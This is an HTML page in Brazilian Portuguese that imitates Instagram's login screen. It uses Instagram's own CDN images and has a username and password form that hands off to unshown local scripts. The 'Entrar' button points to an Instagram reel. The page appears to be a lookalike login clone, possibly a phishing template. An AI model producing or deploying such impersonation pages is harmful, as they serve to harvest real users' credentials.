<!DOCTYPE html>
<html lang="ptb">

<head>
    <link rel="stylesheet" href="reset.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=fp, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">


    <title>Instagram</title>
</head>

<body>
    <section class="body">
        <nav class="idi">
            <p class="idioma">Português(brasil)</p>
        </nav>
        <main>

            <form class="form">

                <div class="logo">
                    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
                        style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yc/r/Ho0O6w_61Rh.png&quot;); background-position: 0px 0px; background-size: 176px 181px; width: 175px; height: 54.5px; background-repeat: no-repeat; display: inline-block;"></i>
                </div>
                <div class="formulario">
                    <div id="cfc">

                        <a href="https://www.instagram.com/">
                            <img src="icons8-facebook-48.png" id="fa">
                            <div id="tcont">Continuar com o Facebook</div>
                        </a>
                    </div>

                    <p id='ou'>OU</p>
                    <div class="forlogin">
                        <input type="text" name="login" id='texto' placeholder="Telefone, nome de usuário ou email">
                    </div>
                    <div class="forsenha">
                        <input type="password" name="senha" id="senha" placeholder="Senha">
                        <div id="mostrar">Mostrar</div>
                    </div>
                    <p class="esqueceu"><a href="https://www.instagram.com/accounts/password/reset/">Esqueceu a
                            senha?</a></p>
                    <button id="btnSalvar" type="submit"><a id='bbb'
                            href="https://www.instagram.com/reel/CwIUAGft484/?igshid=MzRlODBiNWFlZA==">Entrar</a></button>
                    <p class="aaa">Não tem uma conta? <a href="https://www.instagram.com/accounts/emailsignup/">Cadastre-se</a></p>
                </div>
            </form>
            <script src="aparece.js"></script>
            <script src="script.js"></script>
            <script src="ssenha.js"></script>
    </section>
    </main>
    <section>

        <footer>
            <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="">
        </footer>



</body>

</html>
